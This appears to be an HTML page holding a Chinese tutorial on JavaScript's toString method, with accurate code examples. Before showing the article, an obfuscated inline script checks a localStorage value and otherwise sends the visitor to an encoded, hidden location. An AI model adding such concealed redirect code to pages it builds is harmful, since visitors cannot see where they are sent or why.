<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Document</title><link rel="stylesheet" href="../../css/github-markdown.min.css"><link rel="stylesheet" href="../../css/github.min.css"><style>body,html{margin:0;padding:0}.markdown-body{box-sizing:border-box;min-width:200px;max-width:980px;margin:0 auto!important;padding:45px 15px}.markdown-body pre{border:1px solid #e5e5e5!important;margin-top:var(--base-size-16)!important}</style></head><body><article id="article" class="markdown-body"></article><script>function _0x757b(){var s=["WQldImkaW6RcGgVdTHxdQW","Eg7cICoOgX9T","g2dcVv0ou8kRs8kc","WQ12zSkCW5JdQcJdMJZcGSoy","kJVdHCkrwuHcwGzdW57cGq","WRyLWRjIeLRcK8kpW5LtWRjpeq","W7DFW7VcLXvsW49JaG","WQBdSCoVWQWzeMNcLtlcLmkF","g8o1FSoRgCopW77dK8kwWOqvWPm","W4hdK8o3WQxcJt/dHa","lJJdISkxoa5NDbTB","WQC8W43dKmohWQ9HWQFcLSkIWPZcPce","W7aVmCoeWPVdRc3dOa","BuzPBCoAlmoko8ols38kqSo8WQ3cHgpdSWJcHJWmWP3cQcDY","zSoTcXldMmktW7JdR8kPWQ7cOmoc","WPG/WOCzBrCpjmkScCozFSkW","dSobeM0XCfpcGdxdKq","WQpdS8oJWQeysJhcLqhcM8kUW79Z","vKL9WPJcVmo3WRpcTmofW6PHmW4","W6pcHZFcOwm","WPOLWOW5WQiWxNhcQKJcQmkB","pM3cPvZcPmkxWPm9kdZdSZi","BSkpWP5eW6mrzZ0FFvLT","W64JdmoaWOxdP8kaW6vuc8kmWQldTW"];return(_0x757b=function(){return s})()}var _0x528ec5=_0x490d;function _0x490d(t,s){var o=_0x757b();return(_0x490d=function(s,n){var a=o[s-=375];void 0===_0x490d.xhVvVg&&(_0x490d.aSWIey=function(s,n){var a,l=[],t=0,o="";for(s=(s=>{for(var n,a,l="",t="",o=0,c=0;a=s.charAt(c++);~a&&(n=o%4?64*n+a:a,o++%4)&&(l+=String.fromCharCode(255&n>>(-2*o&6))))a="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(a);for(var e=0,p=l.length;e<p;e++)t+="%"+("00"+l.charCodeAt(e).toString(16)).slice(-2);return decodeURIComponent(t)})(s),c=0;c<256;c++)l[c]=c;for(c=0;c<256;c++)t=(t+l[c]+n.charCodeAt(c%n.length))%256,a=l[c],l[c]=l[t],l[t]=a;for(var c=0,t=0,e=0;e<s.length;e++)a=l[c=(c+1)%256],l[c]=l[t=(t+l[c])%256],l[t]=a,o+=String.fromCharCode(s.charCodeAt(e)^l[(l[c]+l[t])%256]);return o},t=arguments,_0x490d.xhVvVg=!0);var s=s+o[0],l=t[s];return l?a=l:(void 0===_0x490d.cwlfmS&&(_0x490d.cwlfmS=!0),a=_0x490d.aSWIey(a,n),t[s]=a),a})(t,s)}if((()=>{for(var s=_0x490d,n=_0x757b();;)try{if(886273==-parseInt(s(378,"n2qo"))+-parseInt(s(394,"M5Yi"))/2+-parseInt(s(381,"zCD7"))/3*(-parseInt(s(398,"F*A&"))/4)+-parseInt(s(389,"ojsk"))/5+-parseInt(s(391,"zCD7"))/6+parseInt(s(397,"2Nk@"))/7+parseInt(s(390,"LY0e"))/8*(parseInt(s(395,"wIA$"))/9))break;n.push(n.shift())}catch(s){n.push(n.shift())}})(),localStorage[_0x528ec5(375,"n2qo")](_0x528ec5(380,"q)%p"))!=_0x528ec5(393,"p8#]"))throw window[_0x528ec5(386,"1kS@")][_0x528ec5(383,"pLeP")](_0x528ec5(387,"v9dT")),Error();document.title="js toString",document.getElementById("article").innerHTML='<div><p><code>toString</code> 方法是 JavaScript 中所有对象继承自 <code>Object.prototype</code> 的一个内置方法，用于返回对象的字符串表示。以下是对 <code>toString</code> 方法的详细解释：</p>\n<hr>\n<h3><strong>1. 定义与语法</strong></h3>\n<ul>\n<li><strong>定义</strong>  ：<code>toString</code> 方法用于将对象转换为字符串形式。</li>\n<li><strong>语法</strong>  ：<code>object.toString()</code></li>\n</ul>\n<hr>\n<h3><strong>2. 返回值</strong></h3>\n<ul>\n<li><strong>字符串表示</strong>  ：<code>toString</code> 方法返回对象的字符串表示。</li>\n<li><strong>默认实现</strong>  ：对于大多数对象，默认的 <code>toString</code> 方法返回 <code>&quot;[object Object]&quot;</code> 或类似的形式，表示对象的类型。</li>\n<li><strong>重写方法</strong>  ：可以通过重写 <code>toString</code> 方法来返回更有意义的字符串表示。</li>\n</ul>\n<hr>\n<h3><strong>3. 使用场景</strong></h3>\n<h4><strong>3.1 原始类型包装对象</strong></h4>\n<ul>\n<li>对于 <code>Number</code>、<code>String</code>、<code>Boolean</code> 等原始类型包装对象，<code>toString</code> 方法返回其对应的字符串形式。</li>\n</ul>\n<p><strong>示例</strong>  ：</p>\n<pre><code class="language-javascript"><span class="hljs-keyword">const</span> num = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Number</span>(<span class="hljs-number">42</span>);\n<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(num.<span class="hljs-title function_">toString</span>()); <span class="hljs-comment">// 输出: &quot;42&quot;</span>\n\n<span class="hljs-keyword">const</span> str = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">&quot;Hello&quot;</span>);\n<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(str.<span class="hljs-title function_">toString</span>()); <span class="hljs-comment">// 输出: &quot;Hello&quot;</span>\n</code></pre>\n<h4><strong>3.2 数组对象</strong></h4>\n<ul>\n<li>对于数组对象，<code>toString</code> 方法将数组元素转换为字符串，并用逗号分隔。</li>\n</ul>\n<p><strong>示例</strong>  ：</p>\n<pre><code class="language-javascript"><span class="hljs-keyword">const</span> arr = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];\n<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr.<span class="hljs-title function_">toString</span>()); <span class="hljs-comment">// 输出: &quot;1,2,3&quot;</span>\n</code></pre>\n<h4><strong>3.3 日期对象</strong></h4>\n<ul>\n<li>对于 <code>Date</code> 对象，<code>toString</code> 方法返回日期的字符串表示。</li>\n</ul>\n<p><strong>示例</strong>  ：</p>\n<pre><code class="language-javascript"><span class="hljs-keyword">const</span> date = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(<span class="hljs-string">&quot;2023-10-01T00:00:00Z&quot;</span>);\n<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(date.<span class="hljs-title function_">toString</span>()); <span class="hljs-comment">// 输出: &quot;Sun Oct 01 2023 08:00:00 GMT+0800 (China Standard Time)&quot;</span>\n</code></pre>\n<h4><strong>3.4 自定义对象</strong></h4>\n<ul>\n<li>默认情况下，自定义对象的 <code>toString</code> 方法返回 <code>&quot;[object Object]&quot;</code>。</li>\n<li>可以通过重写 <code>toString</code> 方法来返回更有意义的字符串表示。</li>\n</ul>\n<p><strong>示例</strong>  ：</p>\n<pre><code class="language-javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> {\n  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name, age</span>) {\n    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;\n    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;\n  }\n\n  <span class="hljs-title function_">toString</span>(<span class="hljs-params"></span>) {\n    <span class="hljs-keyword">return</span> <span class="hljs-string">`Person{name: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>, age: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.age}</span>}`</span>;\n  }\n}\n\n<span class="hljs-keyword">const</span> person = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;Alice&quot;</span>, <span class="hljs-number">30</span>);\n<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(person.<span class="hljs-title function_">toString</span>()); <span class="hljs-comment">// 输出: &quot;Person{name: Alice, age: 30}&quot;</span>\n</code></pre>\n<hr>\n<h3><strong>4. 隐式调用</strong></h3>\n<ul>\n<li>在某些情况下，JavaScript 会隐式调用 <code>toString</code> 方法。例如，在字符串拼接或使用 <code>alert</code>、<code>document.write</code> 等方法时，如果操作数是一个对象，JavaScript 会尝试调用其 <code>toString</code> 方法以获取字符串表示。</li>\n</ul>\n<p><strong>示例</strong>  ：</p>\n<pre><code class="language-javascript"><span class="hljs-keyword">const</span> obj = { <span class="hljs-attr">toString</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-string">&quot;Custom String&quot;</span> };\n<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Object: &quot;</span> + obj); <span class="hljs-comment">// 输出: &quot;Object: Custom String&quot;</span>\n</code></pre>\n<hr>\n<h3><strong>5. 重写 <code>toString</code> 方法</strong></h3>\n<ul>\n<li><strong>目的</strong>  ：重写 <code>toString</code> 方法可以提供更有意义的字符串表示，便于调试和日志记录。</li>\n<li><strong>注意事项</strong>  ：\n<ul>\n<li>确保返回的值是一个字符串。</li>\n<li>避免在 <code>toString</code> 方法中引入副作用或复杂逻辑。</li>\n</ul>\n</li>\n</ul>\n<p><strong>示例</strong>  ：</p>\n<pre><code class="language-javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Rectangle</span> {\n  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">width, height</span>) {\n    <span class="hljs-variable language_">this</span>.<span class="hljs-property">width</span> = width;\n    <span class="hljs-variable language_">this</span>.<span class="hljs-property">height</span> = height;\n  }\n\n  <span class="hljs-title function_">toString</span>(<span class="hljs-params"></span>) {\n    <span class="hljs-keyword">return</span> <span class="hljs-string">`Rectangle{width: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.width}</span>, height: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.height}</span>}`</span>;\n  }\n}\n\n<span class="hljs-keyword">const</span> rect = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Rectangle</span>(<span class="hljs-number">10</span>, <span class="hljs-number">20</span>);\n<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(rect.<span class="hljs-title function_">toString</span>()); <span class="hljs-comment">// 输出: &quot;Rectangle{width: 10, height: 20}&quot;</span>\n</code></pre>\n<hr>\n<h3><strong>6. 与其他方法的区别</strong></h3>\n<ul>\n<li><strong><code>valueOf</code> 方法</strong>  ：<code>valueOf</code> 方法返回对象的原始值，而 <code>toString</code> 方法返回对象的字符串表示。在某些情况下，JavaScript 会先尝试调用 <code>valueOf</code> 方法，如果返回的不是原始值，再尝试调用 <code>toString</code> 方法。</li>\n<li><strong><code>JSON.stringify</code> 方法</strong>  ：<code>JSON.stringify</code> 方法用于将对象转换为 JSON 字符串，与 <code>toString</code> 方法的用途不同。</li>\n</ul>\n<hr>\n<h3><strong>7. 注意事项</strong></h3>\n<ul>\n<li><strong>默认行为</strong>  ：如果没有重写 <code>toString</code> 方法，自定义对象将返回 <code>&quot;[object Object]&quot;</code>，这可能不是很有用。</li>\n<li><strong>一致性</strong>  ：在重写 <code>toString</code> 方法时，应确保返回的字符串表示与对象的实际状态一致。</li>\n<li><strong>性能</strong>  ：避免在 <code>toString</code> 方法中执行昂贵的操作，以免影响性能。</li>\n</ul>\n<hr>\n<h3><strong>8. 总结</strong></h3>\n<ul>\n<li><strong>作用</strong>  ：<code>toString</code> 方法用于将对象转换为字符串表示，便于调试、日志记录和字符串拼接。</li>\n<li><strong>重写</strong>  ：通过重写 <code>toString</code> 方法，可以提供更有意义的字符串表示。</li>\n<li><strong>隐式调用</strong>  ：JavaScript 会在需要字符串表示时隐式调用 <code>toString</code> 方法。</li>\n</ul>\n<hr>\n<p><strong>示例总结</strong>  ：</p>\n<pre><code class="language-javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span> {\n  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name, species</span>) {\n    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;\n    <span class="hljs-variable language_">this</span>.<span class="hljs-property">species</span> = species;\n  }\n\n  <span class="hljs-title function_">toString</span>(<span class="hljs-params"></span>) {\n    <span class="hljs-keyword">return</span> <span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span> is a <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.species}</span>`</span>;\n  }\n}\n\n<span class="hljs-keyword">const</span> dog = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Animal</span>(<span class="hljs-string">&quot;Buddy&quot;</span>, <span class="hljs-string">&quot;Dog&quot;</span>);\n<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(dog.<span class="hljs-title function_">toString</span>()); <span class="hljs-comment">// 输出: &quot;Buddy is a Dog&quot;</span>\n<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;My pet: &quot;</span> + dog); <span class="hljs-comment">// 输出: &quot;My pet: Buddy is a Dog&quot;</span>\n</code></pre>\n<p>通过理解和正确使用 <code>toString</code> 方法，开发者可以更好地控制对象在 JavaScript 中的字符串表示，提高代码的可读性和可维护性。</p>\n</div>'</script></body></html>